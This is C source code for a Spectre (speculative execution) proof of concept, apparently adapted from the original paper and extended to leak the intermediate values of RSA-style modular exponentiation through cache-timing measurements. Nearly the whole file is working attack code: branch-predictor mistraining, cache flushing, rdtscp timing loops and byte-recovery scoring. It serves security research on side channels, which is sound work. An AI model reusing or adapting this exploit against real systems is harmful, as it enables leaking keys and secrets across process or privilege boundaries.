/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <windows.h>
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

extern uint32_t fastmodexp(uint32_t base, uint32_t exp, uint32_t mod);
extern uint32_t modexp(uint32_t base, uint32_t exp, uint32_t mod);
extern void victim_function_rsa8(size_t x1, uint32_t base);
extern void victim_function_rsa6(size_t x1, uint32_t base);
extern void victim_function_rsa5(size_t x1, uint32_t base);
extern void victim_function_rsa4(size_t x1, uint32_t base);
extern void victim_function_rsa2(size_t x1, uint32_t base);
extern void victim_function_rsa1(size_t x1, uint32_t base);
extern void __cdecl SpecRSA1(size_t x1, uint32_t base);
extern void __cdecl SpecRSA2(size_t x1, uint32_t base);
extern void __cdecl SpecRSA4(size_t x1, uint32_t base);
extern void __cdecl SpecRSA5(size_t x1, uint32_t base);
extern void __cdecl SpecRSA6(size_t x1, uint32_t base);
extern void __cdecl SpecRSA8(size_t x1, uint32_t base);

#define P 61
#define Q 53

extern uint32_t _n;
extern uintptr_t _ns;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512 * 4];

//uint32_t sec[] = { 0x1c1c1c1c, 0x80880080, 0xc4c4c4c4, 0x4c4c4c4c };
char* buf = "\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00";
char* sec = "\x1a\x1b\x1c\x1d\x80\x88\x00\x80\xc4\xc4\xc4\xc4\x4c\x4c\x4c\x4c";
uint32_t _exp = 17;

uint8_t tmp = 0; /* Used so compiler won't optimize out victim_function() */


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
	float * p = (float *)addr;
	float c = 0.f;
	__m128 i = _mm_setr_ps(c, c, c, c);

	int k, l;
	/* Non-sequential memory addressing by looping through k by l */
	for (k = 0; k < 4; k++)
		for (l = 0; l < 4; l++)
			_mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

#ifndef NOCLFLUSH
#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
_mm_clflush(&array1_size);\
for (volatile int z = 0; z < 100; z++) {}\
x = ((j % 6) - 1) & ~0xFFFF;\
x = (x | (x >> 16));\
x = training_x ^ (x & (malicious_x ^ training_x));\
Func(x, base);\
}
#else
#define TrainCall(Func) for (j = 29; j >= 0; j--) {\
for (l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {\
	junk2 = cache_flush_array[l];\
}\
for (volatile int z = 0; z < 100; z++) {}\
x = ((j % 6) - 1) & ~0xFFFF;\
x = (x | (x >> 16));\
x = training_x ^ (x & (malicious_x ^ training_x));\
Func(x, base);\
}
#endif

int nlz1(unsigned x) {
	int n;

	if (x == 0) return(32);
	n = 0;
	if (x <= 0x0000FFFF) { n = n + 16; x = x << 16; }
	if (x <= 0x00FFFFFF) { n = n + 8; x = x << 8; }
	if (x <= 0x0FFFFFFF) { n = n + 4; x = x << 4; }
	if (x <= 0x3FFFFFFF) { n = n + 2; x = x << 2; }
	if (x <= 0x7FFFFFFF) { n = n + 1; }
	return n;
}


/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryDword(int cache_hit_threshold, size_t malicious_x, uint8_t value[2 * 4], int score[2 * 4], uint32_t base, int idx) {
	static int results[4][256];
	int tries, i, i2, j, jj[4], k[4], mix_i, junk = 0;
	size_t training_x, x;
	uint8_t array1vals[4];
	register uint64_t time1, time2;
	volatile uint8_t * addr;

#ifdef NOCLFLUSH
	int junk2 = 0;
	int l;
#endif

	for (i2 = 0; i2 < 4; i2++) {
		for (i = 0; i < 256; i++) {
			results[i2][i] = 0;
		}
	}
	for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
		/* Flush array2[256*(0..255)] from cache */
		for (i2 = 0; i2 < 4; i2++) {
			for (i = 0; i < 256; i++) {
				_mm_clflush(&array2[i2 * 512 * 256 + i * 512]); /* intrinsic for clflush instruction */
			}
		}
#else
		/* Flush array2[256*(0..255)] from cache
		using long SSE instruction several times */
		for (j = 0; j < 16; j++)
			for (i2 = 0; i2 < 4; i2++) {
				for (i = 0; i < 256; i++) {
					flush_memory_sse(&array2[i2 * 512 * 256 + i * 512]);
				}
			}
#endif

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;		
		switch (idx) {
		case 0:
			//*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) + base) + n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa1); break;
		case 1:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n; 
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa2); break;
		case 2:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n; 
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa4); break;
		case 3:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n; 
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa8); break;
		case 4:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA1); break;
		case 5:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA2); break;
		case 6:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA4); break;
		case 7:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA8); break; 
		case 8:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa5); break;
		case 9:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA5); break;
		case 10:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(victim_function_rsa6); break;
		case 11:
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1[training_x]) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			*((uint32_t*)&array1vals) = (*((uint32_t*)&array1vals) * (unsigned long long)base) % _n;
			TrainCall(SpecRSA6); break;
		}

		//constant results across training_x and tries is a real problem - so if n is small, all high bits should be turned on
		//*((uint32_t*)&array1vals) |= -(1 << (32 - nlz1(n)));		
		uint8_t mask[4]; *((uint32_t*)&mask) = (1 << (32 - nlz1(_n))) - 1;

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i2 = 3; i2 >= 0; i2--) {
			for (i = 0; i < 256; i++) {
				mix_i = ((i * 167) + 13) & 255;
				addr = &array2[i2 * 512 * 256 + mix_i * 512];

				/*
				We need to accuratly measure the memory access to the current index of the
				array so we can determine which index was cached by the malicious mispredicted code.

				The best way to do this is to use the rdtscp instruction, which measures current
				processor ticks, and is also serialized.
				*/

#ifndef NORDTSCP
				time1 = __rdtscp(&junk); /* READ TIMER */
				junk = *addr; /* MEMORY ACCESS TO TIME */
				time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else

				/*
				The rdtscp instruction was instroduced with the x86-64 extensions.
				Many older 32-bit processors won't support this, so we need to use
				the equivalent but non-serialized tdtsc instruction instead.
				*/

#ifndef NOMFENCE
				/*
				Since the rdstc instruction isn't serialized, newer processors will try to
				reorder it, ruining its value as a timing mechanism.
				To get around this, we use the mfence instruction to introduce a memory
				barrier and force serialization. mfence is used because it is portable across
				Intel and AMD.
				*/

				_mm_mfence();
				time1 = __rdtsc(); /* READ TIMER */
				_mm_mfence();
				junk = *addr; /* MEMORY ACCESS TO TIME */
				_mm_mfence();
				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
				_mm_mfence();
#else
				/*
				The mfence instruction was introduced with the SSE2 instruction set, so
				we have to ifdef it out on pre-SSE2 processors.
				Luckily, these older processors don't seem to reorder the rdtsc instruction,
				so not having mfence on older processors is less of an issue.
				*/

				time1 = __rdtsc(); /* READ TIMER */
				junk = *addr; /* MEMORY ACCESS TO TIME */
				time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
				if (time2 <= cache_hit_threshold && ((mix_i & ~mask[i2]) == 0 && (mask[i2] == 0 || (uint8_t)(mix_i & mask[i2]) != array1vals[i2]))) //tries % array1_size])
					results[i2][mix_i]++; /* cache hit - add +1 to score for this value */
			}
		}

		for (i2 = 0; i2 < 4; i2++) {
			/* Locate highest & second-highest results results tallies in j/k */
			jj[i2] = k[i2] = -1;
			for (i = 0; i < 256; i++) {
				if (jj[i2] < 0 || results[i2][i] >= results[i2][jj[i2]]) {
					k[i2] = jj[i2];
					jj[i2] = i;
				}
				else if (k[i2] < 0 || results[i2][i] >= results[i2][k[i2]]) {
					k[i2] = i;
				}
			}
		}

		int b = !0;
		for (i2 = 0; i2 < 4; i2++) {
			b = b && (results[i2][jj[i2]] >= (2 * results[i2][k[i2]] + 5) || (results[i2][jj[i2]] == 2 && results[i2][k[i2]] == 0));
		}
		if (b)
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	for (i2 = 0; i2 < 4; i2++) {
		value[i2 << 1] = (uint8_t)jj[i2];
		score[i2 << 1] = results[i2][jj[i2]];
		value[(i2 << 1) + 1] = (uint8_t)k[i2];
		score[(i2 << 1) + 1] = results[i2][k[i2]];
		results[i2][0] ^= junk; /* use junk so code above won't get optimized out*/
	}
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
	const char * * argv) {

	/* Default to a cache hit threshold of 80 */
	int cache_hit_threshold = 80;

	/* Default for malicious_x is the secret string address */
	size_t malicious_x = 0;// (size_t)(secret - (char *)array1);

	/* Default addresses to read is 40 (which is the length of the secret string) */
	int len = 4;

	int i;

#ifdef NOCLFLUSH
	for (i = 0; i < sizeof(cache_flush_array); i++) {
		cache_flush_array[i] = 1;
	}
#endif
	array1_size = 16;
	_ns = P * Q;
	_n = P * Q;
	for (i = 0; i < sizeof(array2); i++) {
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	}

	/* Parse the cache_hit_threshold from the first command line argument.
	   (OPTIONAL) */
	if (argc >= 2) {
		sscanf(argv[1], "%d", &cache_hit_threshold);
	}

	/* Parse the malicious x address and length from the second and third
	   command line argument. (OPTIONAL) */
	if (argc >= 4) {
		sscanf(argv[2], "%p", (void * *)(&malicious_x));

		/* Convert input value into a pointer */
		malicious_x -= (size_t)array1;

		sscanf(argv[3], "%d", &len);
	}

	/* Print git commit hash */
#ifdef GIT_COMMIT_HASH
	printf("Version: commit " GIT_COMMIT_HASH "\n");
#endif

	/* Print cache hit threshold */
	printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

	/* Print build configuration */
	printf("Build: ");
#ifndef NORDTSCP
	printf("RDTSCP_SUPPORTED ");
#else
	printf("RDTSCP_NOT_SUPPORTED ");
#endif
#ifndef NOMFENCE
	printf("MFENCE_SUPPORTED ");
#else
	printf("MFENCE_NOT_SUPPORTED ");
#endif
#ifndef NOCLFLUSH
	printf("CLFLUSH_SUPPORTED ");
#else
	printf("CLFLUSH_NOT_SUPPORTED ");
#endif

	printf("\n");

	printf("Reading %d bytes:\n", len);

	//malicious_x = (size_t)((char*)buf - (char *)array1);

	/* Default addresses to read is 40 (which is the length of the secret string) */

	int scores[2 * 4];
	uint8_t values[2 * 4];
	LARGE_INTEGER start;
	LARGE_INTEGER stop;
	LARGE_INTEGER frequency;
	QueryPerformanceFrequency(&frequency);
	for (int j = 8; j < 12; j++) {
		while (--len >= 0) {
			//printf("Reading at malicious_x = %p... ", (void *)malicious_x);

			uint32_t c = ((uint32_t*)sec)[3 - len];
			uint32_t val;
			QueryPerformanceCounter(&start);
			for (int k = 0; k < 10000; k++) {
				val = fastmodexp(c, _exp, _n);
			}
			QueryPerformanceCounter(&stop);
			printf("Correct Fast ModExp = 0x%08X... ", val);
			printf("Time: %lf seconds\n", (double)(stop.QuadPart - start.QuadPart) / (double)frequency.QuadPart);
			QueryPerformanceCounter(&start);
			for (int k = 0; k < 10000; k++) {
				val = modexp(c, _exp, _n);
			}
			QueryPerformanceCounter(&stop);
			printf("Correct ModExp = 0x%08X... ", val);
			printf("Time: %lf seconds\n", (double)(stop.QuadPart - start.QuadPart) / (double)frequency.QuadPart);

			int succ = 0, conf = 0;
			LARGE_INTEGER tot = { 0 };
			for (int k = 0; k < 10; k++) {
				c = 1;
				malicious_x = (size_t)((char*)(&c) - (char *)array1);
				QueryPerformanceCounter(&start);
				if (j >= 8) {
					for (i = j == 8 || j == 9 ? 5 : 6; i <= (int)_exp;
						i += j == 8 || j == 9 ? 5 : 6) {
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], j);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
					}
					if (j == 8 || j == 9) {
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], (j - 8) * 4 + 1);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
					}
					else {
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], (j - 10) * 4 + 2);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], (j - 10) * 4);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
					}
				}
				else {
					for (i = j == 0 || j == 4 ? 1 : (j == 1 || j == 5 ? 2 : (j == 2 || j == 6 ? 4 : 8)); i <= (int)_exp;
						i += j == 0 || j == 4 ? 1 : (j == 1 || j == 5 ? 2 : (j == 2 || j == 6 ? 4 : 8))) {
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], j);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
					}

					if (j != 0 && j != 4) {
						readMemoryDword(cache_hit_threshold, malicious_x, values, scores, ((uint32_t*)sec)[3 - len], j & 4);
						c = values[0] | (values[2] << 8) | (values[4] << 16) | (values[6] << 24);
					}
				}
				QueryPerformanceCounter(&stop);

				/* Display the results */
				int IsSucc = (scores[0] >= 2 * scores[1] && scores[2] >= 2 * scores[3] &&
					scores[4] >= 2 * scores[5] && scores[6] >= 2 * scores[7]) ? 1 : 0;
				printf("%s: ", IsSucc ? "Success" : "Unclear");
				int IsEq = val == c;
				printf("%s ", IsEq ? "Correct" : "Incorrect");
				if (IsEq) succ++;
				if (IsSucc && IsEq) conf++;
				printf("0x%08X score=%d %d %d %d ", c, scores[0], scores[2], scores[4], scores[6]);

				if (scores[1] > 0 || scores[3] > 0 || scores[5] > 0 || scores[7] > 0) {
					printf("(second best: 0x%02X%02X%02X%02X score=%d %d %d %d)", values[1], values[3], values[5], values[7], scores[1], scores[3], scores[5], scores[7]);
				}

				printf("  Time: %lf seconds\n", (double)(stop.QuadPart - start.QuadPart) / (double)frequency.QuadPart);
				tot.QuadPart += (stop.QuadPart - start.QuadPart);
				//printf("\n");
			}
			printf("Total Successes: %d Confidence Success: %d Time: %lf\n", succ, conf, (double)tot.QuadPart / (double)frequency.QuadPart);
		}
		len = 4;
	}
  return (0);
}
